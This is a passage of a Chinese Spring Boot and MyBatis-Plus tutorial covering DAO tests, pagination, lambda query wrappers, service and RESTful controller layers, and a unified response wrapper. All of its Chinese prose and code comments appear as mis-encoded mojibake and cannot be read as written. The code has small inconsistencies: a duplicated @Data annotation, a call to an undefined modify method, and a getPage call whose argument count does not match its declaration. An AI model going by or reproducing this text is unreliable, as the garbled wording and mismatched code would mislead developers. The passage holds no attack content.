{\n}\n```\n\n**æ­¥éª¤â‘¤**ï¼šåˆ¶ä½œæµ‹è¯•ç±»æµ‹è¯•ç»“æœ\n\n```java\npackage com.jianjian.dao;\n\n@SpringBootTest\npublic class BookDaoTests {\n\n    @Autowired\n    private BookDao bookDao;\n\n    @Test\n    void testGetById(){\n        System.out.println(bookDao.selectById(1));\n    }\n\n    @Test\n    void testSave(){\n        Book book = new Book();\n        book.setType(\"æµ‹è¯•æ•°æ®123\");\n        book.setName(\"æµ‹è¯•æ•°æ®123\");\n        book.setDescription(\"æµ‹è¯•æ•°æ®123\");\n        bookDao.insert(book);\n    }\n\n    @Test\n    void testUpdate(){\n        Book book = new Book();\n        book.setId(17);\n        book.setType(\"æµ‹è¯•æ•°æ®abcdefg\");\n        book.setName(\"æµ‹è¯•æ•°æ®123\");\n        book.setDescription(\"æµ‹è¯•æ•°æ®123\");\n        bookDao.updateById(book);\n    }\n\n    @Test\n    void testDelete(){\n        bookDao.deleteById(16);\n    }\n\n    @Test\n    void testGetAll(){\n        bookDao.selectList(null);\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. æ‰‹å·¥å¯¼å…¥starteråæ ‡ï¼ˆ2ä¸ªï¼‰ï¼Œmysqlé©±åŠ¨ï¼ˆ1ä¸ªï¼‰\n2. é…ç½®æ•°æ®æºä¸MyBatisPluså¯¹åº”çš„é…ç½®\n3. é…ç½®MPç›¸å…³é…ç½®\n4. å¼€å‘Daoæ¥å£ï¼ˆç»§æ‰¿BaseMapperï¼‰\n5. åˆ¶ä½œæµ‹è¯•ç±»æµ‹è¯•DaoåŠŸèƒ½æ˜¯å¦æœ‰æ•ˆ\n\n### â‘¡åˆ†é¡µåŠŸèƒ½\n\nMyBatis-Plusè‡ªå¸¦åˆ†é¡µæ’ä»¶ï¼Œåªè¦éœ€è¦**å®šä¹‰MPæ‹¦æˆªå™¨å¹¶å°†å…¶è®¾ç½®ä¸ºSpringç®¡æ§çš„bean**å³å¯å®ç°åˆ†é¡µåŠŸèƒ½\n\n```java\n@Configuration\npublic class MPConfig {\n    @Bean\n    public MybatisPlusInterceptor mybatisPlusInterceptor(){\n        //åˆ›å»ºMPçš„æ‹¦æˆªå™¨æ ˆ\n        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();\n        //åˆå§‹åŒ–äº†åˆ†é¡µæ‹¦æˆªå™¨ï¼Œå¹¶æ·»åŠ åˆ°æ‹¦æˆªå™¨æ ˆä¸­\n        //å¦‚æœåæœŸå¼€å‘å…¶ä»–åŠŸèƒ½ï¼Œéœ€è¦æ·»åŠ å…¨æ–°çš„æ‹¦æˆªå™¨ï¼ŒæŒ‰ç…§æ­¤è¡Œçš„æ ¼å¼ç»§ç»­addè¿›å»æ–°çš„æ‹¦æˆªå™¨å°±å¯ä»¥äº†ã€‚\n        interceptor.addInnerInterceptor(new PaginationInnerInterceptor());\n        return interceptor;\n    }\n}\n```\n\nMPæä¾›çš„åˆ†é¡µæ“ä½œAPIå¦‚ä¸‹\n\n```java\n@Test\nvoid testGetPage(){\n    IPage page = new Page(2,5);\n    bookDao.selectPage(page, null);\n    System.out.println(page.getCurrent());\t\t  //å½“å‰é¡µç å€¼\n    System.out.println(page.getSize());\t\t\t   //æ¯é¡µæ˜¾ç¤ºæ•°\n    System.out.println(page.getTotal());\t\t  //æ•°æ®æ€»é‡\n    System.out.println(page.getPages());\t\t //æ€»é¡µæ•°\n    System.out.println(page.getRecords());\t//è¯¦ç»†æ•°æ®\n}\n```\n\nå…¶ä¸­`selectPage`æ–¹æ³•éœ€è¦ä¼ å…¥ä¸€ä¸ªå°è£…åˆ†é¡µæ•°æ®çš„`IPage`å¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡newçš„å½¢å¼åˆ›å»ºè¿™ä¸ªå¯¹è±¡ã€‚åˆ›å»ºæ­¤å¯¹è±¡æ—¶å°±éœ€è¦æŒ‡å®šåˆ†é¡µçš„ä¸¤ä¸ªåŸºæœ¬æ•°æ®\n\n- å½“å‰æ˜¾ç¤ºç¬¬å‡ é¡µ\n- æ¯é¡µæ˜¾ç¤ºå‡ æ¡æ•°æ®\n\nå¯ä»¥é€šè¿‡åˆ›å»ºPageå¯¹è±¡æ—¶åˆ©ç”¨æ„é€ æ–¹æ³•åˆå§‹åŒ–è¿™ä¸¤ä¸ªæ•°æ®\n\n```java\nIPage page = new Page(2,5);\n```\n\nå°†è¯¥å¯¹è±¡ä¼ å…¥åˆ°æŸ¥è¯¢æ–¹æ³•selectPageåï¼Œå¯ä»¥å¾—åˆ°æŸ¥è¯¢ç»“æœï¼Œä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°å½“å‰æ“ä½œæŸ¥è¯¢ç»“æœè¿”å›å€¼ä»ç„¶æ˜¯ä¸€ä¸ªIPageå¯¹è±¡ï¼Œè¿™åˆæ˜¯æ€ä¹ˆå›äº‹ï¼Ÿ\n\n```java\nIPage page = bookDao.selectPage(page, null);\n```\n\nåŸæ¥è¿™ä¸ªIPageå¯¹è±¡ä¸­å°è£…äº†è‹¥å¹²ä¸ªæ•°æ®ï¼Œè€ŒæŸ¥è¯¢çš„ç»“æœä½œä¸ºIPageå¯¹è±¡å°è£…çš„ä¸€ä¸ªæ•°æ®å­˜åœ¨çš„ï¼Œå¯ä»¥ç†è§£ä¸ºæŸ¥è¯¢ç»“æœå¾—åˆ°åï¼Œåˆå¡åˆ°äº†è¿™ä¸ªIPageå¯¹è±¡ä¸­ï¼Œå…¶å®è¿˜æ˜¯ä¸ºäº†é«˜åº¦çš„å°è£…ã€‚\n\n**æ€»ç»“**\n\n1. åˆ†é¡µæ“ä½œä¾èµ–MyBatisPlusåˆ†é¡µæ‹¦æˆªå™¨å®ç°åŠŸèƒ½\n2. ä½¿ç”¨IPageå°è£…åˆ†é¡µæ•°æ®\n\n### â‘¢æ¡ä»¶æŸ¥è¯¢\n\nä»¥å¾€æˆ‘ä»¬å†™æ¡ä»¶æŸ¥è¯¢è¦è‡ªå·±åŠ¨æ€æ‹¼å†™å¤æ‚çš„SQLè¯­å¥ï¼Œç°åœ¨ç®€å•äº†ï¼ŒMPå°†è¿™äº›æ“ä½œéƒ½åˆ¶ä½œæˆAPIæ¥å£ï¼Œè°ƒç”¨ä¸€ä¸ªåˆä¸€ä¸ªçš„æ–¹æ³•å°±å¯ä»¥å®ç°å„ç§å¥—ä»¶çš„æ‹¼è£…ã€‚\n\nä¸‹é¢çš„æ“ä½œå°±æ˜¯æ‰§è¡Œä¸€ä¸ªæ¨¡ç³ŠåŒ¹é…å¯¹åº”çš„æ“ä½œï¼Œç”±likeæ¡ä»¶ä¹¦å†™å˜ä¸ºäº†likeæ–¹æ³•çš„è°ƒç”¨\n\n```java\n@Test\nvoid testGetBy(){\n    //å°è£…æŸ¥è¯¢æ¡ä»¶çš„å¯¹è±¡\n    QueryWrapper<Book> qw = new QueryWrapper<>();\n    //æŸ¥è¯¢æ¡ä»¶\n    qw.like(\"name\",\"Spring\");\n    bookDao.selectList(qw);\n}\n```\n\nç”±äºå±æ€§å­—æ®µåçš„ä¹¦å†™å­˜åœ¨ç€å®‰å…¨éšæ‚£ï¼Œæ¯”å¦‚æŸ¥è¯¢å­—æ®µnameï¼Œå½“å‰æ˜¯ä»¥å­—ç¬¦ä¸²çš„å½¢æ€ä¹¦å†™çš„ï¼Œä¸‡ä¸€å†™é”™ï¼Œç¼–è¯‘å™¨è¿˜æ²¡æœ‰åŠæ³•å‘ç°ï¼Œåªèƒ½å°†é—®é¢˜æŠ›åˆ°è¿è¡Œå™¨é€šè¿‡å¼‚å¸¸å †æ ˆå‘Šè¯‰å¼€å‘è€…ï¼Œä¸å¤ªå‹å¥½ã€‚\n\nMPé’ˆå¯¹å­—æ®µæ£€æŸ¥è¿›è¡Œäº†åŠŸèƒ½å‡çº§ï¼Œå…¨é¢æ”¯æŒLambdaè¡¨è¾¾å¼ã€‚ç”±QueryWrapperå¯¹è±¡å‡çº§ä¸ºLambdaQueryWrapperå¯¹è±¡ï¼Œè¿™ä¸‹å°±è§£å†³äº†ä¸Šè¿°é—®é¢˜çš„å‡ºç°\n\n```java\n@Test\nvoid testGetBy2(){\n    String name = \"1\";\n    LambdaQueryWrapper<Book> lqw = new LambdaQueryWrapper<Book>();\n    lqw.like(Book::getName,\"Spring\");\n    bookDao.selectList(lqw);\n}\n```\n\nä¸ºäº†ä¾¿äºå¼€å‘è€…åŠ¨æ€æ‹¼å†™SQLï¼Œé˜²æ­¢å°†nullæ•°æ®ä½œä¸ºæ¡ä»¶ä½¿ç”¨ï¼ŒMPè¿˜æä¾›äº†åŠ¨æ€æ‹¼è£…SQLçš„å¿«æ·ä¹¦å†™æ–¹å¼\n\n```java\n    @Test\n    void testGetBy3(){\n        String name = \"Spring\";\n        LambdaQueryWrapper<Book> lqw = new LambdaQueryWrapper<Book>();\n        //if(name != null) lqw.like(Book::getName,name);\t\t//æ–¹å¼ä¸€ï¼šJAVAä»£ç æ§åˆ¶\n        lqw.like(name != null,Book::getName,name);\t\t\t\t //æ–¹å¼äºŒï¼šAPIæ¥å£æä¾›æ§åˆ¶å¼€å…³\n        bookDao.selectList(lqw);\n    }\n```\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨QueryWrapperå¯¹è±¡å°è£…æŸ¥è¯¢æ¡ä»¶\n\n2. **æ¨è**ä½¿ç”¨LambdaQueryWrapperå¯¹è±¡\n\n3. æ‰€æœ‰æŸ¥è¯¢æ“ä½œå°è£…æˆæ–¹æ³•è°ƒç”¨\n\n4. æŸ¥è¯¢æ¡ä»¶æ”¯æŒåŠ¨æ€æ¡ä»¶æ‹¼è£…\n\n## 4.ä¸šåŠ¡å±‚å¼€å‘\n\n### â‘ ç®€ä»‹\n\nåˆå­¦è€…è®¤ä¸ºä¸šåŠ¡å±‚å°±æ˜¯è°ƒç”¨æ•°æ®å±‚ï¼Œæ›´ç²¾å‡†çš„è¯´æ³•åº”è¯¥æ˜¯<font color=\"#ff0000\"><b>ç»„ç»‡ä¸šåŠ¡é€»è¾‘åŠŸèƒ½ï¼Œå¹¶æ ¹æ®ä¸šåŠ¡éœ€æ±‚ï¼Œå¯¹æ•°æ®æŒä¹…å±‚å‘èµ·è°ƒç”¨</b></font>ã€‚\n\nä¸€ä¸ªå¸¸è¯†æ€§çš„çŸ¥è¯†æ™®åŠä¸€ä¸‹ï¼Œä¸šåŠ¡å±‚çš„æ–¹æ³•åå®šä¹‰ä¸€å®šè¦ä¸ä¸šåŠ¡æœ‰å…³ï¼Œä¾‹å¦‚ç™»å½•æ“ä½œ\n\n```java\nlogin(String username,String password);\n```\n\nè€Œæ•°æ®å±‚çš„æ–¹æ³•åå®šä¹‰ä¸€å®šä¸ä¸šåŠ¡æ— å…³ï¼Œæ˜¯ä¸€å®šï¼Œä¸æ˜¯å¯èƒ½ï¼Œä¹Ÿä¸æ˜¯æœ‰å¯èƒ½ï¼Œä¾‹å¦‚æ ¹æ®ç”¨æˆ·åå¯†ç æŸ¥è¯¢\n\n```java\nselectByUserNameAndPassword(String username,String password);\n```\n\næˆ‘ä»¬åœ¨å¼€å‘çš„æ—¶å€™æ˜¯å¯ä»¥æ ¹æ®å®Œæˆçš„å·¥ä½œä¸åŒåˆ’åˆ†æˆä¸åŒèŒèƒ½çš„å¼€å‘å›¢é˜Ÿçš„ã€‚\n\næ¯”å¦‚å¼€å‘æ•°æ®å±‚çš„å›¢é˜Ÿï¼Œæ‹¿åˆ°çš„éœ€æ±‚æ–‡æ¡£è¦æ±‚å¯èƒ½æ˜¯è¿™æ ·çš„\n\n```\næ¥å£ï¼šä¼ å…¥ç”¨æˆ·åä¸å¯†ç å­—æ®µï¼ŒæŸ¥è¯¢å‡ºå¯¹åº”ç»“æœï¼Œç»“æœæ˜¯å•æ¡æ•°æ®\næ¥å£ï¼šä¼ å…¥IDå­—æ®µï¼ŒæŸ¥è¯¢å‡ºå¯¹åº”ç»“æœï¼Œç»“æœæ˜¯å•æ¡æ•°æ®\næ¥å£ï¼šä¼ å…¥ç¦»èŒå­—æ®µï¼ŒæŸ¥è¯¢å‡ºå¯¹åº”ç»“æœï¼Œç»“æœæ˜¯å¤šæ¡æ•°æ®\n```\n\nä½†æ˜¯å¼€å‘ä¸šåŠ¡å±‚åŠŸèƒ½å›¢é˜Ÿï¼Œæ‹¿åˆ°çš„éœ€æ±‚æ–‡æ¡£è¦æ±‚å·®åˆ«å°±å¾ˆå¤§\n\n```\næ¥å£ï¼šä¼ å…¥ç”¨æˆ·åä¸å¯†ç å­—æ®µï¼Œå¯¹ç”¨æˆ·åå­—æ®µåšé•¿åº¦æ ¡éªŒï¼Œ4-15ä½ï¼Œå¯¹å¯†ç å­—æ®µåšé•¿åº¦æ ¡éªŒï¼Œ8åˆ°24ä½ï¼Œå¯¹å–µå–µå–µå­—æ®µåšç‰¹æ®Šå­—ç¬¦æ ¡éªŒï¼Œä¸å…è®¸å­˜åœ¨ç©ºæ ¼ï¼ŒæŸ¥è¯¢ç»“æœä¸ºå¯¹è±¡ã€‚å¦‚æœä¸ºnullï¼Œè¿”å›BusinessExceptionï¼Œå°è£…æ¶ˆæ¯ç INFO_LOGON_USERNAME_PASSWORD_ERROR\n```\n\næ‰€ä»¥è¯´ä¸šåŠ¡å±‚æ–¹æ³•å®šä¹‰ä¸æ•°æ®å±‚æ–¹æ³•å®šä¹‰å·®å¼‚åŒ–å¾ˆå¤§\n\n### â‘¡æ™®é€šå¼€å‘\n\n**æ­¥éª¤â‘ **ï¼šä¸šåŠ¡å±‚æ¥å£å®šä¹‰å¦‚ä¸‹ï¼š\n\n```java\npublic interface BookService {\n    Boolean save(Book book);\n    Boolean update(Book book);\n    Boolean delete(Integer id);\n    Book getById(Integer id);\n    List<Book> getAll();\n    IPage<Book> getPage(int currentPage,int pageSize);\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šä¸šåŠ¡å±‚å®ç°ç±»å¦‚ä¸‹ï¼Œè½¬è°ƒæ•°æ®å±‚å³å¯\n\n```java\n@Service\npublic class BookServiceImpl implements BookService {\n\n    @Autowired\n    private BookDao bookDao;\n\n    @Override\n    public Boolean save(Book book) {\n        return bookDao.insert(book) > 0;\n    }\n\n    @Override\n    public Boolean update(Book book) {\n        return bookDao.updateById(book) > 0;\n    }\n\n    @Override\n    public Boolean delete(Integer id) {\n        return bookDao.deleteById(id) > 0;\n    }\n\n    @Override\n    public Book getById(Integer id) {\n        return bookDao.selectById(id);\n    }\n\n    @Override\n    public List<Book> getAll() {\n        return bookDao.selectList(null);\n    }\n\n    @Override\n    public IPage<Book> getPage(int currentPage, int pageSize) {\n        IPage page = new Page(currentPage,pageSize);\n        return bookDao.selectPage(page,null);\n    }\n}\n```\n\nâ€‹\t**æ­¥éª¤â‘¢**ï¼šå¯¹ä¸šåŠ¡å±‚æ¥å£è¿›è¡Œæµ‹è¯•\n\n```java\n@SpringBootTest\npublic class BookServiceTests {\n    @Autowired\n    private BookService bookService;\n\n    @Test\n    void testGetById(){\n        System.out.println(bookService.getById(4));\n    }\n    @Test\n    void testSave(){\n        Book book = new Book();\n        book.setType(\"æµ‹è¯•æ•°æ®123\");\n        book.setName(\"æµ‹è¯•æ•°æ®123\");\n        book.setDescription(\"æµ‹è¯•æ•°æ®123\");\n        bookService.save(book);\n    }\n    @Test\n    void testUpdate(){\n        Book book = new Book();\n        book.setId(17);\n        book.setType(\"-----------------\");\n        book.setName(\"æµ‹è¯•æ•°æ®123\");\n        book.setDescription(\"æµ‹è¯•æ•°æ®123\");\n        bookService.update(book);\n    }\n    @Test\n    void testDelete(){\n        bookService.delete(18);\n    }\n    @Test\n    void testGetAll(){\n        bookService.getAll();\n    }\n    @Test\n    void testGetPage(){\n        IPage<Book> page = bookService.getPage(2, 5);\n        System.out.println(page.getCurrent());\n        System.out.println(page.getSize());\n        System.out.println(page.getTotal());\n        System.out.println(page.getPages());\n        System.out.println(page.getRecords());\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. Serviceæ¥å£åç§°å®šä¹‰æˆä¸šåŠ¡åç§°ï¼Œå¹¶ä¸Daoæ¥å£åç§°è¿›è¡ŒåŒºåˆ†\n2. åˆ¶ä½œæµ‹è¯•ç±»æµ‹è¯•ServiceåŠŸèƒ½æ˜¯å¦æœ‰æ•ˆ\n\n### â‘¢å¿«é€Ÿå¼€å‘\n\nMPä¸ä»…æä¾›äº†æ•°æ®å±‚å¿«é€Ÿå¼€å‘æ–¹æ¡ˆï¼ŒMPä¹Ÿç»™äº†ä¸šåŠ¡å±‚ä¸€ä¸ªé€šç”¨æ¥å£ï¼Œ**ä¸æ¨èä½¿ç”¨**ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªå°è£…+ç»§æ‰¿çš„æ€æƒ³ï¼Œå®é™…å¼€å‘æ…ç”¨\n\n**æ­¥éª¤â‘ **ï¼šä¸šåŠ¡å±‚æ¥å£å¿«é€Ÿå¼€å‘\n\n```java\npublic interface IBookService extends IService<Book> {\n    //æ·»åŠ éé€šç”¨æ“ä½œAPIæ¥å£\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šä¸šåŠ¡å±‚æ¥å£å®ç°ç±»å¿«é€Ÿå¼€å‘ï¼Œç»§æ‰¿çš„ç±»éœ€è¦ä¼ å…¥ä¸¤ä¸ªæ³›å‹ï¼Œä¸€ä¸ªæ˜¯æ•°æ®å±‚æ¥å£ï¼Œå¦ä¸€ä¸ªæ˜¯å®ä½“ç±»\n\n```java\n@Service\npublic class BookServiceImpl extends ServiceImpl<BookDao, Book> implements IBookService {\n    @Autowired\n    private BookDao bookDao;\n\t//æ·»åŠ éé€šç”¨æ“ä½œAPI\n}\n```\n\nå¦‚æœæ„Ÿè§‰MPæä¾›çš„åŠŸèƒ½ä¸è¶³ä»¥æ”¯æ’‘ä½ çš„ä½¿ç”¨éœ€è¦ï¼Œå¯ä»¥åœ¨åŸå§‹æ¥å£åŸºç¡€ä¸Šæ¥ç€å®šä¹‰æ–°çš„APIæ¥å£å°±è¡Œäº†\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨é€šç”¨æ¥å£ï¼ˆISerivce\\<T>ï¼‰å¿«é€Ÿå¼€å‘Service\n2. ä½¿ç”¨é€šç”¨å®ç°ç±»ï¼ˆServiceImpl<M,T>ï¼‰å¿«é€Ÿå¼€å‘ServiceImpl\n3. å¯ä»¥åœ¨é€šç”¨æ¥å£åŸºç¡€ä¸ŠåšåŠŸèƒ½é‡è½½æˆ–åŠŸèƒ½è¿½åŠ \n4. æ³¨æ„é‡è½½æ—¶ä¸è¦è¦†ç›–åŸå§‹æ“ä½œï¼Œé¿å…åŸå§‹æä¾›çš„åŠŸèƒ½ä¸¢å¤±\n\n## 5.æ§åˆ¶å±‚å¼€å‘\n\n### â‘ æ™®é€šRestfulå¼€å‘\n\n**æ­¥éª¤â‘ **ï¼šæ§åˆ¶å±‚æ¥å£å¦‚ä¸‹ï¼ŒåŸºäºRestfulå¼€å‘\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController {\n\n    @Autowired\n    private BookService bookService;\n\n    @GetMapping\n    public List<Book> getAll(){\n        return bookService.list();\n    }\n\n    @PostMapping\n    public Boolean save(@RequestBody Book book){\n        return bookService.save(book);\n    }\n\n    @PutMapping\n    public Boolean update(@RequestBody Book book){\n        return bookService.modify(book);\n    }\n\n    @DeleteMapping(\"{id}\")\n    public Boolean delete(@PathVariable Integer id){\n        return bookService.delete(id);\n    }\n\n    @GetMapping(\"{id}\")\n    public Book getById(@PathVariable Integer id){\n        return bookService.getById(id);\n    }\n\n    @GetMapping(\"{currentPage}/{pageSize}\")\n    public IPage<Book> getPage(@PathVariable int currentPage,@PathVariable int pageSize){\n        return bookService.getPage(currentPage,pageSize, null);\n    }\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šPostmanæµ‹è¯•ï¼Œå…³æ³¨æäº¤ç±»å‹ï¼Œå¯¹åº”ä¸Šå³å¯ï¼Œä¸ç„¶å°±ä¼šæŠ¥405çš„é”™è¯¯ç äº†\n\n- **æ™®é€šGETè¯·æ±‚**\n\n![](https://img.jwt1399.top/img/202209100004375.png)\n\n- **GETè¯·æ±‚ä¼ é€’è·¯å¾„å˜é‡ï¼Œåå°ä½¿ç”¨@PathVariableæ¥æ”¶æ•°æ®**\n\n![](https://img.jwt1399.top/img/202209100004293.png)\n\n- **PUTè¯·æ±‚ä¼ é€’jsonæ•°æ®ï¼Œåå°ä½¿ç”¨@RequestBodyæ¥æ”¶æ•°æ®**\n\n![](https://img.jwt1399.top/img/202209100014797.png)\n\n**æ€»ç»“**\n\n1. åŸºäºRestfulåˆ¶ä½œè¡¨ç°å±‚æ¥å£\n   - æ–°å¢ï¼š@PostMapping\n   - åˆ é™¤ï¼š@DeleteMapping\n   - ä¿®æ”¹ï¼š@PutMapping\n   - æŸ¥è¯¢ï¼š@GetMapping\n2. æ¥æ”¶å‚æ•°\n   - å®ä½“æ•°æ®ï¼š@RequestBody\n   - è·¯å¾„å˜é‡ï¼š@PathVariable\n\n### â‘¡æ¶ˆæ¯ä¸€è‡´æ€§å¼€å‘\n\n> ä¸ºä½•è¦è¿”å›ç»Ÿä¸€æ ¼å¼ã€‚ä¸ºæ–¹ä¾¿ä½¿ç”¨å·²å°è£…å¥½ï¼Œå¯¼å…¥é¡¹ç›®å³å¯ä½¿ç”¨ï¼šhttps://jwt1399.lanzouv.com/iINu80bfh1sd\n\nç°åœ¨å¤§å¤šæ•°webé¡¹ç›®åŸºæœ¬éƒ½æ˜¯å‰åç«¯åˆ†ç¦»æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼ä¼šæ¶‰åŠåˆ°ä¸€ä¸ªå‰åç«¯å¯¹æ¥é—®é¢˜ï¼Œæ‰€ä»¥ä¸€å¥—å®Œå–„ä¸”è§„èŒƒçš„æ¥å£æ˜¯éå¸¸æœ‰å¿…è¦çš„ï¼Œä¸ä»…èƒ½å¤Ÿæé«˜å¯¹æ¥æ•ˆç‡ï¼Œä¹Ÿå¯ä»¥è®©æˆ‘çš„ä»£ç çœ‹èµ·æ¥æ›´åŠ ç®€æ´ä¼˜é›…ã€‚æœ¬èŠ‚å°†è§£å†³å¦‚ä½•è¿”å›ç»Ÿä¸€çš„æ ‡å‡†æ ¼å¼ä»¥åŠå¤„ç†å…¨å±€å¼‚å¸¸ã€‚\n\nå¦‚æœSpringBootä¸ä½¿ç”¨ç»Ÿä¸€è¿”å›æ ¼å¼ï¼Œé»˜è®¤ä¼šæœ‰å¦‚ä¸‹ä¸‰ç§è¿”å›æƒ…å†µã€‚\n\n- è¿”å›å­—ç¬¦ä¸²\n\n```java\n@GetMapping(\"/getUserName\")\npublic String getUserName(){\n    return \"Hello\";\n}\n\n// è¿”å›ç»“æœï¼šHello\n```\n\n- è¿”å›å®ä½“ç±»å¯¹è±¡\n\n```java\n@GetMapping(\"/getUserName\")\npublic User getUserName(){\n    return new User(\"Hello\",18);\n}\n\n// è¿”å›ç»“æœï¼š\n{\n  \"name\": \"Hello\",\n  \"age\": \"18\"\n}\n```\n\n- è¿”å›å¼‚å¸¸\n\n```java\n@GetMapping(\"/getUserName\")\npublic static String getUserName(){\n    HashMap hashMap = new HashMap();\n    return hashMap.get(0).toString(); // æ¨¡æ‹Ÿä¸€ä¸ªç©ºæŒ‡é’ˆå¼‚å¸¸\n}\n\n// è¿”å›ç»“æœï¼š\n{\n    \"timestamp\": \"2022-09-09T12:56:06.549+00:00\",\n    \"status\": 500,\n    \"error\": \"Internal Server Error\",\n    \"path\": \"/getUserName\"\n}\n```\n\nå¯¹äºä¸Šé¢è¿™å‡ ç§æƒ…å†µï¼Œå¦‚æœæ•´ä¸ªé¡¹ç›®æ²¡æœ‰å®šä¹‰ç»Ÿä¸€çš„è¿”å›æ ¼å¼ï¼Œä¸åŒå¼€å‘äººå‘˜å¯èƒ½ä¼šå®šä¹‰ä¸åŒçš„è¿”å›æ ¼å¼ï¼Œè¿™æ ·ä¼šä½¿å‰åç«¯å¯¹æ¥å‡ºç°ä¸€äº›é—®é¢˜ã€‚\n\n#### a. å®šä¹‰è¿”å›æ ‡å‡†\n\nä¸€ä¸ªæ ‡å‡†çš„è¿”å›æ ¼å¼è‡³å°‘åŒ…å«3éƒ¨åˆ†ï¼š\n\n```\ncodeï¼š çŠ¶æ€ç \nmessageï¼š æ¥å£è°ƒç”¨çš„æç¤ºä¿¡æ¯  \ndataï¼š è¿”å›æ•°æ®\n```\n\n**æ­¥éª¤â‘ **ï¼šå®šä¹‰æ•°æ®è¿”å›æ ¼å¼\n\n```java\n@Data\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Result<T> {\n    private int code;\n    private String message;\n    private T data;\n\n    /**\n     * æˆåŠŸ\n     */\n    public static <T> Result<T> success(T data) {\n        Result<T> result = new Result<T>();\n        result.setCode(ResultMsgEnum.SUCCESS.getCode());\n        result.setMessage(ResultMsgEnum.SUCCESS.getMessage());\n        result.setData(data);\n        return result;\n    }\n\n    /**\n     * å¤±è´¥\n     */\n    public static <T> Result<T> fail(ResultMsgEnum resultMsgEnum) {\n        Result<T> result = new Result<T>();\n        result.setCode(resultMsgEnum.getCode());\n        result.setMessage(resultMsgEnum.getMessage());\n        return result;\n    }\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šå®šä¹‰çŠ¶æ€ç \n\n```java\n@Getter\n@NoArgsConstructor\n@AllArgsConstructor\npublic enum ResultMsgEnum {\n    SUCCESS(0, \"æˆåŠŸ\"),\n    FAIL(-1, \"å¤±è´¥\"),\n    TEST_ERROR(400, \"å‘ç”Ÿé”™è¯¯å•¦!\");\n    private int code;\n    private String message;\n}\n```\n\n**æ­¥éª¤â‘¢**ï¼šä½¿ç”¨\n\nä¸Šé¢å®šä¹‰äº†æ•°æ®è¿”å›æ ¼å¼å’ŒçŠ¶æ€ç ï¼Œä¸‹é¢åœ¨æ¥å£ä¸­ä½¿ç”¨ã€‚\n\n```java\n//ç¤ºä¾‹1\n@GetMapping(\"/getUserName\")\npublic Result getUserName(){\n    return Result.success(\"Hello\");\n}\n\n//ç¤ºä¾‹2\n@GetMapping(\"/getUserName\")\npublic static Result getUserName(){\n  HashMap hashMap = new HashMap();\n  return Result.success(hashMap.get(0).toString()); // æ¨¡æ‹Ÿä¸€ä¸ªç©ºæŒ‡é’ˆå¼‚å¸¸\n}\n```\n\nè¿”å›ç»“æœå¦‚ä¸‹\n\n```powershell\n# ç¤ºä¾‹1ç»“æœ\n{\n    \"code\": 0,\n    \"message\": \"æˆåŠŸ\",\n    \"data\": \"Hello\"\n}\n\n# ç¤ºä¾‹2ç»“æœ\n{\n    \"timestamp\": \"2022-09-09T14:45:21.875+00:00\",\n    \"status\": 500,\n    \"error\": \"Internal Server Error\",\n    \"path\": \"/getUserName\"\n}\n```\n\né€šè¿‡åœ¨Controllerå±‚è°ƒç”¨Result.success()å¯¹è¿”å›ç»“æœè¿›è¡ŒåŒ…è£…åè¿”å›ç»™å‰ç«¯ï¼Œè™½ç„¶èƒ½å¤Ÿæ»¡è¶³æ—¥å¸¸éœ€æ±‚ï¼Œä½†æ˜¯å½“æœ‰å¤§é‡çš„æ¥å£æ—¶ï¼Œæ¯ä¸€ä¸ªæ¥å£ä¸­éƒ½ä½¿ç”¨Result.success()æ¥åŒ…è£…è¿”å›ä¿¡æ¯å°±ä¼šå¢åŠ å¾ˆå¤šé‡å¤ä»£ç ï¼Œè€Œä¸”é‡åˆ°å¼‚å¸¸æ•°æ®æ ¼å¼æ— æ³•ç»Ÿä¸€ã€‚\n\n#### c .ç»Ÿä¸€æ¥å£è¿”å›\n\nå‰é¢æ­¥éª¤ä¸å¤Ÿä¼˜é›…ï¼Œå¯ä»¥ç»§ç»­æ”¹è¿›ï¼Œç”¨ **@RestControllerAdvice** æ³¨è§£ï¼Œæ‹¦æˆªä¸‹åç«¯è¿”å›çš„æ•°æ®ï¼Œå®ç° **ResponseBodyAdvice** æ¥å£å¯¹æ•°æ®åšä¸€å±‚åŒ…è£…å†è¿”å›ç»™å‰ç«¯ã€‚\n\n> `ResponseBodyAdvice`ï¼š è¯¥æ¥å£æ˜¯SpringMVC 4.1æä¾›çš„ï¼Œå®ƒå…è®¸åœ¨ æ‰§è¡Œ@ResponseBodyåè‡ªå®šä¹‰è¿”å›æ•°æ®ï¼Œç”¨æ¥å°è£…ç»Ÿä¸€æ•°æ®æ ¼å¼è¿”å›ï¼›æ‹¦æˆªControlleræ–¹æ³•çš„è¿”å›å€¼ï¼Œç»Ÿä¸€å¤„ç†è¿”å›å€¼/å“åº”ä½“ï¼Œä¸€èˆ¬ç”¨æ¥ç»Ÿä¸€è¿”å›æ ¼å¼ï¼ŒåŠ è§£å¯†ï¼Œç­¾åç­‰\n>\n> `@RestControllerAdvice`ï¼š è¯¥æ³¨è§£æ˜¯Controllerçš„å¢å¼ºç‰ˆï¼Œå¯ä»¥å…¨å±€æ•è·æŠ›å‡ºçš„å¼‚å¸¸ï¼Œå…¨å±€æ•°æ®ç»‘å®šï¼Œå…¨å±€æ•°æ®é¢„å¤„ç†ã€‚\n\n**æ­¥éª¤â‘ **ï¼šæ–°å»ºResponseAdviceç±»ï¼Œè¯¥ç±»ç”¨äºç»Ÿä¸€å°è£…controllerä¸­æ¥å£çš„è¿”å›ç»“æœã€‚å®ç°ResponseBodyAdviceæ¥å£ï¼Œå®ç°supportsã€beforeBodyWriteæ–¹æ³•ã€‚\n\n```java\n@RestControllerAdvice\npublic class ResponseAdvice implements ResponseBodyAdvice<Object> {\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    /**\n     * æ˜¯å¦å¼€å¯åŠŸèƒ½ true:å¼€å¯\n     */\n    